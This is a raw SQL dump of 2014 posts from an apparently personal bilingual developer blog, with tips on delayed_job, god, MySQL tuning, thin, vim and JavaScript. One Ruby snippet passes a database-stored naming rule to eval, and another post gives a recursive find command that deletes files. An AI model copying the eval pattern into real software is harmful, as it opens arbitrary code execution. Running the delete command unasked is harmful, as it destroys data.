@file_name = ...\r\n    return @file_name\r\n  end \r\n  # 于是改成 instance method: ( let\'s change it to instance method) \r\n  def generate_file_name_by_url url, naming_rule\r\n    @file_name = ...\r\n    return @file_name\r\n  end   \r\n</pre>\r\n\r\n<p> 于是现在的 unit test 和 implementation 分别是： ( so for now, the rspec and implementation are)</p>\r\n<pre>  it \'should get_file_name_by_url\' do\r\n    file_name = @target_url.generate_file_name_by_url @target_url.url, @plan.naming_rule\r\n    # ... \r\n  end\r\n\r\nclass TargetUrl\r\n  # ...\r\n  def generate_file_name_by_url url, naming_rule\r\n    @params = Rack::Utils.parse_query(URI(url).query).to_options\r\n    @file_name = \'\'\r\n    eval(naming_rule)\r\n    return @file_name\r\n  end \r\nend\r\n</pre>\r\n<p>结论： 不要偷懒， TDD 永远可以让我们设计出最合适的实现方式。 &#160;(conclusion: &#160;don\'t be lazy. always TDD, which help us write better-designed code )&#160;</p>',0,'2014-05-12 02:11:00','2014-05-12 02:35:36','2014-05-12 02:35:36',1,NULL,'same-method-in-different-declarations','','','',247,'same-method-in-different-declarations'),(252,'delayed_job + god 组合使用  ( using delayed_job with god ) ','<p>项目中用到了delayed_job 这个神器。 &#160;缺点是它有时候自己遇到 mysql_connection_error 就会关掉。 &#160;( my project heavily used delayed_job, and we found it will stop if met some error or exceptions. and I want to restart it via web GUI http request )&#160;</p>\r\n<p>于是我想到用god来控制它。 &#160;( so it\'s time to use GOD (http://godrb.com )&#160;</p>\r\n<p>god 的脚本针对两种进程： 一种是普通的进程， 一种是daemon进程。 &#160;delayed_job的脚本运行后，是daemon进程，所以它的god配置文件就略有不同（ 注意其中的pid 属性） &#160; ( there are 2 kind of processes in god: &#160;normal , daemon . so the config files are different. below is the daemon config file, notice its \"pid\" segment )</p>\r\n<pre># 使用方法：\r\n# 1. 修改 RAILS_ROOT\r\n# 2. 修改 start 命令和 log 日志的地点\r\n# 3. 调试时，记得有4分钟的延迟时间。不要问为什么delay_job脚本启动了但是SQL中仍然有JOB记录。\r\n# 4. 而且 delayed_job 有自己的 sleep_time, 默认是60秒。\r\nRAILS_ROOT = \'/sg552/workspace/m-api-cache-cleaner\'\r\nGod.watch do |w| \r\n  w.name = \'cache_cleaner\'\r\n  w.dir = RAILS_ROOT\r\n  w.start = \"cd #{RAILS_ROOT} &amp;&amp; RAILS_ENV=production bundle exec bin/delayed_job -n 5 start\"\r\n  w.stop = \"cd #{RAILS_ROOT} &amp;&amp; RAILS_ENV=production bundle exec bin/delayed_job stop\"\r\n  w.restart = \"cd #{RAILS_ROOT} &amp;&amp; RAILS_ENV=production bundle exec bin/delayed_job -n 5 restart\"\r\n  w.log = \"#{RAILS_ROOT}/log/cache_cleaner_stdout.log\"\r\n  # 根据实际使用的效果，这个参数，god 是不会建立pid_file的\r\n  # 因为 delayed_job -n 5 start 会生成自己的PID文件\r\n  # 但是我们仍然要给它一个随便的值，这标志该任务是 “有自己的daemon“的任务\r\n  w.pid_file = File.join(RAILS_ROOT, \"log/delayed_job.total.pid\")\r\n  # 不需要为 delayed_job 指定这个参数。因为delayed_job有休眠时间。god会不断的唤醒它。。\r\n  w.keepalive\r\nend\r\n\r\n</pre>\r\n<p>一点儿经验： 由于pid文件没有正常生成，所以 god不会实时监控，并且 keepalive对应的进程（也就是说，我把5个delayed_job 干掉一个之后， god不会自动的重启它） &#160; &#160; &#160;( because the god \"pid\" file is omitted, &#160;god won\'t keep an eye on the stopped process )&#160;</p>\r\n<p>但是一个变通方法是: &#160;(a workaround to keep alive delayed_job child-processes: )&#160;</p>\r\n<pre>$ god restart cache_cleaner</pre>\r\n\r\n<p> 在god运行状态下，我们可以这样加载： &#160;( we could load config file in run-time)&#160;</p>\r\n<pre>$ god stop cache_cleaner\r\n$ god remove cache_cleaner\r\n$ god load /opt/app/path/cache_cleaner.god\r\n$ god start cache_cleaner\r\n$ god status\r\ncache_cleaner: start </pre>\r\n\r\n<p> 现在可以看到， 5个delayed_job 都已经跑起来了： &#160;( now we see all the 5 processes running)&#160;</p>\r\n<pre>09:04 [root@a03.test.3g.b28.youku]$ ps -ef | grep delayed\r\nroot      3683 31684  0 08:54 pts/4    00:00:00 tail delayed_job.log -f\r\nroot      7842     1  4 09:04 ?        00:00:18 delayed_job.1                    \r\nroot      7843     1  4 09:04 ?        00:00:19 delayed_job.0                    \r\nroot      7872     1  5 09:04 ?        00:00:20 delayed_job.2                    \r\nroot      7940     1  5 09:05 ?        00:00:19 delayed_job.3                    \r\nroot      7956     1  5 09:05 ?        00:00:19 delayed_job.4      \r\n</pre>\r\n',0,'2014-05-13 01:06:00','2014-05-13 01:16:33','2014-05-13 01:16:33',1,NULL,'using-delayed-job-with-god','','','',326,'using-delayed-job-with-god'),(253,'做个有意思的统计： 垃圾回复的特点： ( key features of the spam comments ) ','<p>不经意之间，我的个人博客居然有1000+ 回复（2周内吧）， 看了下，99.9% 都是垃圾恢复。特点都是：</p>\r\n<p>1. 内容中带有： href</p>\r\n<p>2. http://</p>\r\n<p>3. https://</p>\r\n<p>直接干掉没商量 。&#160;</p>',0,'2014-05-13 01:20:00','2014-05-13 01:22:55','2014-05-13 01:22:55',1,NULL,'features-of-spam-comments','','','',297,'features-of-spam-comments'),(254,'在iframe中使用 a link到别的站点( a link jump from current iframe to another site) ','<p>原始的错误是：&#160;Overcoming “Display forbidden by X-Frame-Options”</p>\r\n<p>解决办法： &#160; &#160;&lt;a href=\'anothersite.com/aaabbbccc.html\' target=\"_top\"&gt; some other site url &lt;/a&gt;&#160;</p>',0,'2014-05-14 05:47:00','2014-05-14 05:50:05','2014-05-14 05:50:05',1,NULL,'a-link-to-another-site-from-iframe','','','',311,'a-link-to-another-site-from-iframe'),(255,'写个  delayed_job 的 process monitor ','<p>虽然官方网站已经有了几个开源的项目，但是我个人觉得用不上啊。先记录在这里好了。&#160;</p>\r\n<p> 78   def update_delayed_job<br /> 79     CmsDelayedJobForClient.delete_all(\"handler like \'%#{self.class}%id: #{self.id}\\\\n%\'\")<br /> 80     Delayed::Job.enqueue(ScheduledOnlineJob.new(self), :run_at =&gt; self.begin_at) if begin_at.p<br /> 81     Delayed::Job.enqueue(ScheduledOfflineJob.new(self), :run_at =&gt; self.end_at) if end_at.pres<br /> 82   end<br /></p>',0,'2014-05-14 07:14:00','2014-05-14 07:15:14','2014-05-14 07:15:14',1,NULL,'','','','',253,'delayed_job-process-monitor'),(256,'路由器太久没重启也会导致VPN连不上！ ( restart your LAN to connect VPN)','<p>如题！！！ &#160;太坑跌了！！！ &#160;我差点就赶回 公司了！！！</p>\r\n<p>重启霞路由器，两个电脑都能脸上了!!!!! &#160; 得救了！</p>',0,'2014-05-16 13:57:00','2014-05-16 13:59:10','2014-05-16 13:59:10',1,NULL,'restart-router-to-connect-vpn','','','',272,'restart-router-to-connect-vpn'),(257,'linux 下查看 某个process 的所在位置（ find out which folder a process is running from)','<p>$ ls -l /proc/22503/cwd &#160; &#160;( 22503 is your proccess id )</p>\r\n<p>就是这么简单（so easy! )&#160;</p>\r\n<p>感谢 沛沛  (<a href=\"http://www.hanpeipei.com/\">http://www.hanpeipei.com/ </a>) 告诉我这个技巧。</p>',0,'2014-05-18 02:26:00','2014-05-18 02:29:11','2014-05-18 02:29:11',1,NULL,'find-out-which-folder-process-is-running-from','','','',260,'find-out-which-folder-process-is-running-from'),(258,'delayed_job: max_run_time 一定不要设定过短 ( max_run_time should be shorter than any kind of job )','<p>今天被这个问题搞死了。 ( I am almost beaten by this issue today)&#160;</p>\r\n<p>有两种JOB: 一种是父JOB， 专门生成子job. 一种是 \"子job\" &#160;( I have 2 kinds of job: spawner job which generates normal jobs, normal job)</p>\r\n<p>前者 耗时比较久， 5分钟左右， 后者3秒以内。 ( the spawner lasts minutes, and normal jobs last less than 3 seconds)&#160;</p>\r\n<p>今天发现的问题是： &#160;父JOB正常来说应该只运行一次，结果发现它会运行2～3次不等。 ( today I found that spawner job always run more than I time)&#160;</p>\r\n<p>弄了3个小时以后才发现问题： &#160;配置 中的 max_run_time 太短了，导致每次delayed_job 都以为正常运行的父JOB失败了呢。结果第二个WORKER就开始工作了。。。 ( after 3 hours I found the root cause: I set max_run_time too short ( 1 minute ))</p>\r\n<pre>  ( 看到了吗？ 每次都差1分钟）\r\nsg552@youku:/sg552/workspace/m-cms-static-page-generator/log$ grep \'generating\' delayed_job_2014-05-18.log \r\n16:42:25 INFO: == a plan is generating 1512 files/jobs \r\n16:43:26 INFO: == a plan is generating 1512 files/jobs \r\n</pre>\r\n\r\n<p>解决办法： 增加 max_run_time, 让它不短于任何一种job: &#160; ( solution is: increase the \"max_run_time\" option to make it longer than any job)&#160;</p>\r\n<pre> (修改 max_run_time )\r\n# -*- encoding : utf-8 -*-\r\n# config/initializers/delayed_job_config.rb\r\nDelayed::Worker.destroy_failed_jobs = false\r\nDelayed::Worker.sleep_delay = 10\r\nDelayed::Worker.max_attempts = 5 \r\nDelayed::Worker.max_run_time = 30.minutes  \r\nDelayed::Worker.read_ahead = 10\r\nDelayed::Worker.default_queue_name = \'default\'\r\n</pre>',0,'2014-05-18 08:45:00','2014-05-18 09:03:22','2014-05-18 09:03:22',1,NULL,'max_run_time-should-be-set-properly','','','',296,'max_run_time-should-be-set-properly'),(259,'jquery.shorten的使用中无法出现\'...\'的问题 (no ellipse text when using jquery.shorten?)','<p>比如，一段文字过长，使用了 jquery.shorten之后，没有出现 ...? &#160; &#160; ( your long wrapped text is not ended with ellipse text? )&#160;</p>\r\n<p>原文(original long text) ： &#160;\"I love you so so so so so much!\"</p>\r\n<p>expected: \"I love you ...\"<br />but it may be \"I love you\" &#160;( ellipse text missing)&#160;</p>\r\n<p>解决办法： &#160;记得长文字前后要用&lt;p&gt; 给包围起来，例如： &#160;(solution: wrap the long text with a HTML tag)&#160;</p>\r\n<pre>&lt;div&gt;  I love you so so so so so much! &lt;/div&gt;\r\nshould be:\r\n&lt;div&gt;\r\n  &lt;p&gt;  I love you so so so so so much! &lt;/p&gt;\r\n&lt;/div&gt;\r\n</pre>',0,'2014-05-19 02:54:00','2014-05-19 02:59:33','2014-05-19 02:59:33',1,NULL,'no-ellipse-text-using-jquery.shorten','','','',293,'no-ellipse-text-using-jquery-shorten'),(260,'optimize Mysql config( 优化MYSQL）','<p>最近在MYSQL上跑了一组 delayed_job, 发现有问题： 同时开始6个worker时 MYSQL 的CPU使用率就占到了150%. &#160;( I found the \'mysql process\' costing 150% cpu time when running a group of delayed_jobs -- about 10 workers , so I decide to optimize it)</p>\r\n<p>优化方式： 先看看目前的各种数据： ( before the optimization, let me check its status: )&#160;</p>\r\n<pre>mysql&gt; show variables like \'%query_cache%\';\r\n+------------------------------+---------+\r\n| Variable_name                | Value   |\r\n+------------------------------+---------+\r\n| have_query_cache             | YES     | \r\n| query_cache_limit            | 1048576 | \r\n| query_cache_min_res_unit     | 4096    | \r\n| query_cache_size             | 0       | \r\n| query_cache_type             | ON      | \r\n| query_cache_wlock_invalidate | OFF     | \r\n+------------------------------+---------+\r\n6 rows in set (0.00 sec)\r\n\r\n</pre>\r\n<p>可以看到， 基本没有任何优化， query_cache_size 居然是0， 我无了个语。。。 &#160; 果断修改 mysql 配置（ $ vim /etc/my.conf ) &#160; ( see? &#160;the query_cache_size = 0.... oh my god... )&#160;</p>\r\n<pre>[mysqld]\r\n#  other items... \r\nquery_cache_limit = 128M\r\nquery_cache_size = 512M\r\n\r\n</pre>\r\n<p>哦也！ &#160; &#160;( now it works very well under pressure! )&#160;</p>\r\n<p>p.s. 其他命令：</p>\r\n<p>$ show processlist;</p>\r\n<p>$ show index from &lt;table&gt;;</p>\r\n<p>$ check slow_log: $ tail /var/log/&lt;log_file&gt; -f</p>',0,'2014-05-22 05:44:00','2014-05-22 06:23:16','2014-05-22 09:22:03',1,NULL,'mysql-optimization','','','',309,'mysql-optimization'),(261,'why delayed_job\'s priority is: lower is more imporant ? (为什么delayed_job的priority是数字越小越重要？）','<p>delayed_job有两个分支，一个是 &#160;collectiveidea的(https://github.com/collectiveidea/delayed_job/wiki, priority越小越重要），一个是 tobi的(https://github.com/tobi/delayed_job 已经不再维护) ;</p>\r\n<p>今天用delayed_job生成了 5W个子任务，然后发现任务进行的很慢：&#160;</p>\r\n<p>mysql一直是占用150%的CPU</p>\r\n<p>每秒 最多处理10个任务，而不是5K左右job下的 30job/s. &#160;</p>\r\n<p>考虑了很久查看了slow_query, 发现有时候一个update需要耗时 6秒以上。而且发现了这个文章：\r\n<a href=\"http://www.elevatedcode.com/2009/11/04/speeding-up-delayed-job.html\" target=\"_blank\">http://www.elevatedcode.com/2009/11/04/speeding-up-delayed-job.html</a>\r\n</p>\r\n<p>总结了一下，原来在大数据量下面， 问题的瓶颈在于一个查询，这个 查询的优化方式是需要对两个列进行排序的索引：</p>\r\n<p>\" ... where .... &#160;order by priority desc, run_at asc \"&#160;</p>\r\n<p>而对于一般的数据库来说（例如最常见的MYSQL），他可以进行两个column的组合索引，但是结果是 \"priority asc, run_at asc\"， 而不是 \"priority desc, run_at asc\" (据说oracle可以这样做） &#160;</p>\r\n<p>所以，解决的办法是：</p>\r\n<p>1. 对priority + run_at 增加组合索引</p>\r\n<p>2. 对 priority 越小越重要，这样就可以写出: &#160;\"... order by priority asc, run_at asc\"&#160;</p>',0,'2014-05-22 08:28:00','2014-05-22 08:43:36','2014-05-22 08:43:36',1,NULL,'why-delayed-job-priority-lower-is-more-important','','','',284,'why-delayed-job-priority-lower-is-more-important'),(262,'thin + rackup + yml的启动方式 ( thin + config.ru + thin.yml )','<p>对于ruby-cas, 我们目前使用的方式是 &#160;thin + config.ru ： &#160;( currently , we are using ruby-cas (rack) + thin )</p>\r\n<p> 当前的启动方式是：  (已经存在的config.ru 文件如下 ) &#160;( current start command is as below: )</p>\r\n<p>$ bundle exec thin start -R config.ru -p 3535 -e production -d </p>\r\n<pre>  # config.ru\r\nrequire \'rubygems\'\r\nrequire \'bundler/setup\'\r\n\r\n$:.unshift \"#{File.dirname(__FILE__)}/lib\"\r\nrequire \"casserver\"\r\n\r\nuse Rack::ShowExceptions\r\nuse Rack::Runtime\r\nuse Rack::CommonLogger\r\n\r\nrun CASServer::Server.new\r\n\r\n</pre>\r\n\r\n<p>1. 命令行： &#160; ( so , this is the command line )&#160;</p>\r\n<p>$ bundle exec thin start -R config.ru -p 3535 -e production -d</p>\r\n<p>2. 如果要启动多个服务器呢？  （启动3535， 3536 两个端口） &#160;( this is how to start multiple servers in one command)&#160;</p>\r\n<p>$ bundle exec thin start -R config.ru -p 3535 -e production -d -s 2 </p>\r\n<p>3. 使用 config.yml 的方式：  $ bundle exec thin start -C thin.yml &#160; ( start servers using config.yml file)&#160;</p>\r\n<pre>---\r\nchdir: /opt/app/ruby/m-cas\r\nenvironment: production\r\naddress: 0.0.0.0\r\nport: 3501\r\ntimeout: 30\r\nlog: log/thin.log\r\npid: tmp/pids/thin.pid\r\nrackup: config.ru    # &lt; ==  NOTICE this. \r\nmax_conns: 1024\r\nmax_persistent_conns: 512 \r\nrequire: []\r\nwait: 5\r\nservers: 8\r\ndaemonize: true\r\n\r\n</pre>\r\n',0,'2014-05-26 00:51:00','2014-05-26 00:57:57','2014-05-26 00:57:57',1,NULL,'thin-config.ru-thin.yml','','','',379,'thin-config-ru-thin-yml'),(263,'install ssh-server on ubuntu','<p>$&#160;sudo apt-get install openssh-server</p>\r\n<p>$ sudo start/stop ssh</p>',0,'2014-05-27 00:39:00','2014-05-27 01:30:01','2014-05-27 01:30:01',1,NULL,'install-ssh-server-on-ubuntu','','','',295,'install-ssh-server-on-ubuntu'),(264,'greplace 详解 (vim plugin greplace introduction) ','<p>greplace 是VIM程序员必备技能，可以帮我们批量查询和替换。</p>\r\n<p>例如，查找当前 目录下的所有rb文件中的 \'prefix\' ：</p>\r\n<pre># notice the \".\" before \"-R\'\r\n:Gsearch -F \'prefix\' . -R  --include=*rb   \r\n\r\n  2 # Modify the contents of this buffer and then\r\n  3 # use the \":Greplace\" command to merge the changes.\r\n  4 #\r\n  5 app/helpers/target_url_helper.rb:6:      Settings.static_files.folder_prefix, plan.folder_name\r\n  6 app/models/target_url.rb:31:    folder_prefix = Rails.env==\'test\' ?\r\n  7 app/models/target_url.rb:32:      Settings.static_files.folder_prefix_for_unit_test :\r\n\r\n在上面的文件，使用 %s 做完替换后， \r\n:Greplace \r\n就可以了。\r\n最后 \r\n:wa \r\n保存所有的改动。\r\n</pre>',0,'2014-05-27 02:42:00','2014-05-27 02:45:39','2014-05-27 02:45:39',1,NULL,'vim-plugin-greplace','','','',320,'vim-plugin-greplace'),(265,'删除7天前的文件  ( delete files older than 7 days ago ) ','<p>$ find . -type f -mtime +7 -delete</p>\r\n<p>$ find . -name \'*.log\' -mtime +7 -delete </p>\r\n<p>refer to : <a href=\"http://www.abestweb.com/forums/programming-datafeeds-tools-188/help-how-delete-files-before-certain-date-linux-64662.html\" target=\"_blank\">http://www.abestweb.com/forums/programming-datafeeds-tools-188/help-how-delete-files-before-certain-date-linux-64662.html</a>\r\n</p>',0,'2014-05-27 02:53:00','2014-05-27 02:54:25','2014-05-27 02:58:05',1,NULL,'delete-files-certain-days-ago','','','',304,'delete-files-certain-days-ago'),(266,'httparty使用 timeout (using timeout in httparty) ','an example: \r\n\r\n<pre>  1 # -*- encoding : utf-8 -*-\r\n  2 class StaticFilesController &lt; ApplicationController\r\n  3   include HTTParty\r\n  4   default_timeout 3\r\n 11   \r\n 12   def get_generator_plans\r\n 13     self.class.get \'some/url\'\r\n 14   end\r\n 15 end\r\n\r\n</pre>',0,'2014-06-03 01:19:00','2014-06-03 01:20:39','2014-06-03 01:20:39',1,NULL,'using-timeout-in-httparty','','','',372,'using-timeout-in-httparty'),(267,'convert RGB to hex colors using gimp (使用gimp把rgb格式的颜色转换成 hex 格式)','<p>1. 点击颜色板 (click the color panel )</p>\r\n<p>2. 在 R。G。B中分别输入数值 (input R.G.B)</p>\r\n<p>3. HTML notation中就可以看到HEX值了。 ( see the HTML notation for the hex value)&#160;</p>\r\n<div><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNi8wNi8wN180NV8yM183MjJfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDZfMDZfMDdfNDBfMTIucG5nBjoGRVQ/Screenshot%20from%202014-06-06%2007png:12.:ext\" title=\"Screenshot From 2014 06 06 07:40:12\" alt=\"Screenshot From 2014 06 06 07:40:12\" rel=\"225x255\" width=\"1280.1818182468414\" height=\"800.1818182468414\" /></div>',0,'2014-06-05 23:38:00','2014-06-05 23:46:00','2014-06-05 23:46:00',1,NULL,'convert-rgb-to-hex-colors-using-gimp','','','',292,'convert-rgb-to-hex-colors-using-gimp'),(268,'动态调用JS方法的几种方法 (dynamically call js funtions) ','<pre>say_hi =function(){\r\n  alert(\'hi\')\r\n}\r\n</pre>\r\n\r\n<p># refer to: http://stackoverflow.com/questions/969743/how-do-i-call-a-dynamically-named-method-in-javascript<br />1. window[\'say_hi\']()  #global method</p>\r\n<p># refer to : http://stackoverflow.com/questions/15202942/javascript-dynamic-function-call-with-name<br />2. this[\'say_hi\']()  # defined in some namespace</p>\r\n<p># http://viralpatel.net/blogs/calling-javascript-function-from-string/<br />3. eval(\"say_hi()\")</p>',0,'2014-06-06 04:37:00','2014-06-06 04:39:30','2014-06-06 04:39:30',1,NULL,'dynamically-call-javascript-functions','','','',237,'dynamically-call-javascript-functions'),(269,'再谈一种 bad code smell','<p>在 微信的“接入指南”中 (<a href=\"http://mp.weixin.qq.com/wiki/index.php?title=%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97\">http://mp.weixin.qq.com/wiki/index.php?title=%E6%8E%A5%E5%85%A5%E6%8C%87%E5%8D%97</a>：</p>\r\n\r\n<pre>private function checkSignature()\r\n{\r\n       // .....\r\n	\r\n	if( $tmpStr == $signature ){\r\n		return true;\r\n	}else{\r\n		return false;\r\n	}\r\n}\r\n</pre>\r\n<p>直接写成这样是不是更好？ &#160;( it isn\'t this a better implementation ? )&#160;</p>\r\n<pre>private function checkSignature()\r\n{\r\n       // .....\r\n	return $tmpStr == $signature\r\n}\r\n</pre>\r\n<p>我对PHP 不懂，如果真的是可以的话，我在想腾讯的PHP er们是不是可以改进下文档？</p>',0,'2014-06-07 08:42:00','2014-06-07 08:46:24','2014-06-07 08:46:24',1,NULL,'another-bad-code-smell','','','',233,'another-bad-code-smell'),(270,'一种看迅雷电影的方式','<p>1. 登录迅雷云空间 （lixian.xunlei.com)&#160;</p>\r\n<p>2. 下载任务到云空间</p>\r\n<p>3. 在线播放。 哦也！</p>\r\n<p>我会说正在看 《普罗米修斯》？ ^_^</p>',0,'2014-06-07 13:09:00','2014-06-07 13:10:52','2014-06-07 13:10:52',1,NULL,'watch-xunlei-in-linux','','','',245,'watch-xunlei-in-linux'),(271,'在IE8下调整IE6,IE7的样式 ( adjusting IE6/7 using IE8 developer tool) ','<p>1. 使用IE8打开对应的HTML 页面（ using IE8 open HTML file)</p>\r\n<p>2. 按F12. 就可以跟在 chrome中一样操作（ press F12 to open the developer tool)&#160;</p>\r\n<p>3. 选择 quirk modes/standard modes 就可以分别做调整。 ( choosing quirk/standark modes to debug)&#160;</p>',0,'2014-06-12 02:39:00','2014-06-12 02:41:56','2014-06-12 02:41:56',1,NULL,'adjusting-ie-browser-using-ie8','','','',222,'adjusting-ie-browser-using-ie8'),(272,'mongodb export/import v.s. dump/restore ','<p>In contrast, use import and export tools to backup a small subset of your data or to move data to or from a third party system.</p>\r\n<p>mongodump<br />Export MongoDB data to BSON files.</p>',0,'2014-06-12 09:36:00','2014-06-12 10:17:17','2014-06-12 10:17:17',1,NULL,'mongodb-export-import-vs-dump-restore','','','',214,'mongodb-export-import-vs-dump-restore'),(273,'jquery animation的一种实现模式 ( an implementation of jquery animation) ','<p>我们在页面中，总是要对某些元素的展示作出动画效果。&#160;</p>\r\n<p>经过实践，我们发现，最好不要在页面的初始化时就设置好某个元素的位置。 而是需要<br />1. 把它保留原有的元素位置不动。&#160;<br />2. 使用 jquery.css() 方法设置目标的 初始化位置<br />3. 使用 jquery.animation() 方法 将目标的位置变回来。&#160;</p>\r\n<p>例如： \r\n</p>\r\n<pre>  // 正确的办法： 使用JS 先把目标元素设置个偏移量，然后再把它移动回来。\r\n               $(\'#\' + id_selector).children(\'img\').last()\r\n                 .css(\'margin-left\', \'+=50px\')\r\n                 .animate({ opacity: 1.0, \'margin-left\': \'-=50\' }, 1000, after_call_back )\r\n</pre>\r\n<p>see:&#160;https://github.com/sg552/test_animation/blob/master/animation.js</p>\r\n',0,'2014-06-12 11:17:00','2014-06-12 11:21:54','2014-06-12 11:31:35',1,NULL,'an-implementation-of-jquery-animation','','','',200,'an-implementation-of-jquery-animation'),(274,'动态的声明JS 方法（define functions in javascript dynamically ) ','<p> 下面的代码是不是看起来很可恶？  (isn\'t it too smelly? )</p>\r\n<pre>restart_services_animation = function(){\r\n  high_light_link_on_right_menu(\'services\')\r\n  if($(\'#services_animation_is_showing\').length &gt; 0 || $(\'#services_animation_is_shown\').length &lt; 1) {\r\n    return;\r\n  }\r\n  cancel_services_animation()\r\n  start_services_animation()\r\n}\r\n\r\nrestart_cases_animation = function(){\r\n  high_light_link_on_right_menu(\'cases\')\r\n  if($(\'#cases_animation_is_showing\').length &gt; 0 || $(\'#cases_animation_is_shown\').length &lt; 1) {\r\n    return;\r\n  }\r\n  cancel_cases_animation()\r\n  start_cases_animation()\r\n}\r\n</pre>\r\n\r\n<p> 动态的声明 它们：  ( dynamically define functions as below) </p>\r\n<pre>// 这里是动态的方法声明和调用。 声明以下四个方法：\r\n// restart_index_animation()\r\n// restart_services_animation()\r\n// restart_cases_animation()\r\n// restart_about_us_animation()\r\n$([\'index\', \'services\', \'cases\', \'about_us\']).each(function(i,e){\r\n  window[\'restart_\' + e + \'_animation\'] = function() {\r\n    high_light_link_on_right_menu( e )\r\n    if($(\'#\' + e + \'_animation_is_showing\').length &gt; 0 ||\r\n        $(\'#\' + e + \'_animation_is_shown\').length &lt; 1) {\r\n      return;\r\n    }\r\n    // 动态的方法调用，例如： cancel_services_animation()\r\n    window[\'cancel_\'+e+\'_animation\']()\r\n    // 动态的方法调用，例如： start_services_animation()\r\n    window[\'start_\' + e + \'_animation\']()\r\n  }\r\n})</pre>\r\n<p>see: <a target=\"_blank\" href=\"http://stackoverflow.com/questions/8309242/how-to-dynamically-build-a-function-in-javascript\">http://stackoverflow.com/questions/8309242/how-to-dynamically-build-a-function-in-javascript</a>\r\n</p>',0,'2014-06-12 11:27:00','2014-06-12 11:30:58','2014-06-12 11:30:58',1,NULL,'define-functions-in-javascript-dynamically','','','',194,'define-functions-in-javascript-dynamically'),(275,'使用top命令时按模式查看命令(patterns for name when using top command) ','<p>$ top -d 1 -p `pgrep -d, ruby`</p>\r\n<p>上面的命令只查看当前系统中 的\'ruby\' 进程。</p>',0,'2014-06-13 07:31:00','2014-06-13 07:33:07','2014-06-13 07:33:07',1,NULL,'advanced-top-command','','','',258,'advanced-top-command'),(276,'linux set datetime (linux 下设置时间）','<p># date --set=\"26 Nov 2012 18:00:00\"</p>',0,'2014-06-16 09:22:00','2014-06-17 02:16:09','2014-06-17 02:16:09',1,NULL,'set-date-under-linux','','','',208,'set-date-under-linux'),(277,'无法部署capistrano ( Capistrano cannot deploy code, because Net::SSH::AuthenticationFailed: Authentication failed ) ','<p>solution: &#160;</p>\r\n<p># add to Gemfile:&#160;</p>\r\n<p>gem \'net-ssh\', \'2.7.0\' &#160;&#160;</p>\r\n<p>done.&#160;</p>\r\n<p>refer to: <a href=\"http://stackoverflow.com/questions/21811026/capistrano-cannot-deploy-code-because-netsshauthenticationfailed-authentic\" target=\"_blank\">http://stackoverflow.com/questions/21811026/capistrano-cannot-deploy-code-because-netsshauthenticationfailed-authentic</a>\r\n</p>',0,'2014-06-19 08:15:00','2014-06-19 08:17:42','2014-06-19 08:17:42',1,NULL,'capstrano-failed-because-of-net-ssh-authentication-failed','','','',237,'capstrano-failed-because-of-net-ssh-authentication-failed'),(278,'回忆陈老大昨天的讲话','<p>昨天陈老大给我们上了一课。 &#160;关于移动APP的发展。 从心理学，社会学，各种文化领域做了分析。&#160;</p>\r\n<p>收获很大！ 总结的话，就一点:</p>\r\n<p>吸引用户。让用户觉得你有用。离不开。&#160;</p>\r\n<p>逼格？ 90后？&#160;</p>\r\n<p>一个大男人穿着有姨妈巾的内裤睡觉3个月。。。这个精神。。。</p>',0,'2014-06-19 15:26:00','2014-06-19 15:30:02','2014-06-19 15:30:02',1,NULL,'a-lesson-from-big-boss','','','',205,'a-lesson-from-big-boss'),(279,'查看下载服务器情况（how to check your download server status) ','<p>今天早上接到服务器报警，所以有几个办法：</p>\r\n<p>1. $ iptraf 命令。 选择general interface statistics ， &#160; 在 activity 一栏中可以看到传出数据的流量/s. &#160;如图。</p>\r\n<p><img src=\"/system/images/BAhbBlsHOgZmSSJEMjAxNC8wNi8yMC8xMF80Nl8xNl81MjhfU2NyZWVuc2hvdF9mcm9tXzIwMTRfMDZfMjBfMTBfNDRfNTQucG5nBjoGRVQ/Screenshot%20from%202014-06-20%2010png:54.:ext\" title=\"Screenshot From 2014 06 20 10:44:54\" alt=\"Screenshot From 2014 06 20 10:44:54\" rel=\"225x255\" width=\"1280.1818182468414\" height=\"800.1818182468414\" /></p>\r\n<p>2. 查看nginx 日志。 &#160;看看哪些资源被请求的多。&#160;</p>',0,'2014-06-20 02:44:00','2014-06-20 02:48:19','2014-06-20 02:48:19',1,NULL,'how-to-check-download-server-status','','','',190,'how-to-check-download-server-status'),(280,'无法安装node的解决办法（how to install node in centos 5.8 )','<p>最近遇到的问题是： 在一个centos 5.8的机器上无法使用node. 无论是下载node 32位还是64位安装包都不行。提示说： unable to execute...（同32位机器上运行64位的程序一样）&#160;</p>\r\n<p>解决方案： 下载node source , 编译安装。 &#160;(solution: &#160;download the source file and then compile it~ )&#160;</p>',0,'2014-06-20 05:17:00','2014-06-20 05:20:19','2014-06-20 05:20:19',1,NULL,'install-node-on-centos','','','',396,'install-node-on-centos'),(281,'install ffmpeg on ubuntu12/13','<p><a target=\"_blank\" href=\"https://trac.ffmpeg.org/wiki/CompilationGuide/Ubuntu\">Compile FFmpeg on Ubuntu, Debian, or Mint </a>\r\n<br />Contents<br />Get the Dependencies<br />Compilation &amp; Installation<br />Conclusion<br />Updating FFmpeg<br />Reverting Changes Made by This Guide<br />If You Need Help<br />Also See<br />This guide for supported releases of Ubuntu, Debian, and Linux Mint will provide a local install of the latest FFmpeg tools and libraries including several external encoding and decoding libraries (codecs). This will not interfere with repository packages.</p>\r\n<p>You may also refer to the Generic FFmpeg Compilation Guide for additional information.</p>\r\n<p>Recent ​static builds are also available for lazy people or those who are unable to compile.</p>\r\n<p>Get the Dependencies</p>\r\n<p>Copy and paste the whole code box for each step.</p>\r\n<p>sudo apt-get update<br />sudo apt-get -y install autoconf automake build-essential libass-dev libfreetype6-dev libgpac-dev \\<br />  libsdl1.2-dev libtheora-dev libtool libva-dev libvdpau-dev libvorbis-dev libx11-dev \\<br />  libxext-dev libxfixes-dev pkg-config texi2html zlib1g-dev<br />mkdir ~/ffmpeg_sources<br />Notes:</p>\r\n<p>Server users can omit the ffplay and x11 dependencies: libsdl1.2-dev libva-dev libvdpau-dev libx11-dev libxext-dev libxfixes-dev.<br />Lucid lacks the package libva-dev. This can be ignored.<br />Compilation &amp; Installation</p>\r\n<p>You can compile ffmpeg to your liking. If you do not require certain encoders you may skip the relevant section and then remove the appropriate ./configure option in FFmpeg. For example, if libopus is not needed, then skip that section and then remove --enable-libopus from the Install FFmpeg section.</p>\r\n<p>This guide is designed to be non-intrusive and will create several directories in your home directory:</p>\r\n<p>ffmpeg_sources – 